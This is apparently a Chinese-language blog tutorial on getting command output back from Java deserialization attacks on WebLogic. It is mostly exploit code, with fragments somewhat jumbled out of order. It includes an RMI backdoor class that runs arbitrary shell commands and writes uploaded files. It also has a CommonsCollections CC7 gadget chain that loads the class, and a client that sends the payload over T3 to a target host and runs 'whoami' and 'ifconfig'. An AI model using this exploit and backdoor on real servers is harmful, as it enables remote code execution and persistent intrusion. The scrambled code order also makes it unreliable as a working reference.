import java.rmi.RemoteException;
public class ECHOClass extends AbstractTranslet implements ClusterMasterRemote {
    static {
        try{
            Context ctx = new InitialContext();
            ctx.rebind("echo", new ECHOClass());
        }catch (Exception e){
        }
    }
    @Override
    public void setServerLocation(String path, String text) throws 
RemoteException {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(new BASE64Decoder().decodeBuffer(text));
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {
        }
    }
    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {
            if (cmd.equals("unbind")) {
                Context ctx = new InitialContext();
                ctx.unbind("sectest");
                return null;
            } else{
                String name = System.getProperty("os.name");
                String[] cmds = name != null && 
name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new 
String[]{"sh", "-c", cmd};
                InputStream in = 
Runtime.getRuntime().exec(cmds).getInputStream();
                byte[] buf = new byte[1024];
                int len = 0;
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                while ((len = in.read(buf)) != -1) {
                    out.write(buf, 0, len);
                }
                return new String(out.toByteArray());
            }
        }catch (Exception e){
        }
        return null;
这里该接口需要重写2个方法，一个返回类型为String，一个是void类型。那么这里使用返回类型为
String的 getServerLocation 方法来做命令执行回显，而 setServerLocation 作为上传的方法。在反
序列化的时候，结合利用链将该类打入目标服务器中，打入后会进行我们的 echo 会绑定 ECHOClass 这
个实例。然后再去调用一下代码进行命令执行回显。
而这里继承 AbstractTranslet 是为了某些利用链 TemplatesImpl 的动态加载。
 改写cc链
最终代码
最终想使用cc7使用 ClasspathClassLoader 来做命令执行。
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws 
TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, 
SerializationHandler handler) throws TransletException {
    }
}
Object obj= getInitContext(protocol,host,port).lookup("echo");
ClusterMasterRemote shell = (ClusterMasterRemote)obj;
String result = shell.getServerLocation("whoami");
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(DefiningClassLoader.class),
    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, 
new Object[]{new Class[0]}),
    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new 
Object[]{new Object[0]}),
    new InvokerTransformer("defineClass",
                           new Class[]{String.class, byte[].class}, new Object[]
{className, byteclass}),
    new InvokerTransformer("getMethod", new Class[]{String.class, 
Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, 
new Object[]{null, new Object[]{}}),
    new ConstantTransformer(new HashSet())};
public class test {
    private static String host = "192.168.22.132";
    private static String port = "7001";
    public static void main(String[] args) {
        try {
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            invokeRMI();
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, 
"weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, url);
            env.put("weblogic.jndi.requestTimeout",15000L);
            InitialContext initialContext = new InitialContext(env);
            ClusterMasterRemote remote = (ClusterMasterRemote) 
initialContext.lookup("echo");
            // 调用RMI实例执行命令
            String res = remote.getServerLocation("ifconfig");
            System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void invokeRMI() throws Exception {
        byte[] buf = ClassFiles.classAsBytes(ECHOClass.class);
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(ClasspathClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor",
                        new Class[]{Class[].class},
                        new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance",
                        new Class[]{Object[].class},
                        new Object[]{new Object[0]}),
                new InvokerTransformer("defineCodeGenClass",
                        new Class[]{String.class, byte[].class, URL.class}, new 
Object[]{ECHOClass.class, buf, null}),
                new ConstantTransformer(1)};
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force 
element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        Reflections.setFieldValue(transformerChain, "iTransformers", 
transformers);
        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(hashtable);
        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();
        T3ProtocolOperation.send(host, port, payload);
    }
}
在rmi绑定实例回显中实际上就是打入一个rmi的后门，然后进行调用该后门进行执行命令，并且回显。
中间件回显
Java安全之反序列化回显与内存马
Java安全之挖掘回显链
Reference
Weblogic使用ClassLoader和RMI来回显命令执行结果
0x02 结尾
不仅限于这些方法，还有其他的一些回显方法，比如说写文件或dnslog，比较简单。但例如dnslog这些
在不出网的情况就不行了。